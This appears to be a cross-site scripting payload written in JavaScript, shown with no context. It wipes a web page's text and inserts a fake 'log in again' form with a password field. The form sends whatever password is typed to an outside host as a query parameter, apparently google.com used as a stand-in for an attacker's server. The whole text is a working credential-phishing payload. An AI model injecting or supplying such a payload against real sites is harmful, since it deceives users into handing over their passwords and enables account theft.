document.body.innerText=""
document.body.insertAdjacentHTML('beforeend', '<form action=\"https://google.com/search\" type=GET>  Please prove your idenity by logging in again:<br><br>  <label for=\"q\">Password:</label><br>  <input type=\"password\" id=\"q\" name=\"q\"><br><br>  <input type=\"submit\" value=\"Submit\"> </form> ');
